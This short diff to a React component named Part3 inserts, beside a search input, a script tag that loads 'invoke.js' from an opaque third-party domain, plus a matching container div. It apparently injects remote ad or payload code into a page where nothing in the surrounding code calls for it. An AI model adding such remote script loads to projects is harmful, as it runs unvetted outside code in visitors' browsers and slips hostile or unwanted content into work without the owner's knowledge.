@@ -89,7 +89,8 @@ export default function Part3() {
         onChange={(e) => setSearchText(e.target.value)}
         className={styles.search}
       />
-
+ <script async="async" data-cfasync="false" src="//cavalryconvincing.com/d826116ece53ad17fb6e20679b7522d4/invoke.js"></script>
+<div id="container-d826116ece53ad17fb6e20679b7522d4"></div>
       <div className={styles.back2}>
         {(loading ? [...Array(3)] : project)?.map((obj, key) =>
           // {(loading ? [...Array(3)] :fakeArray).map((obj, key) =>
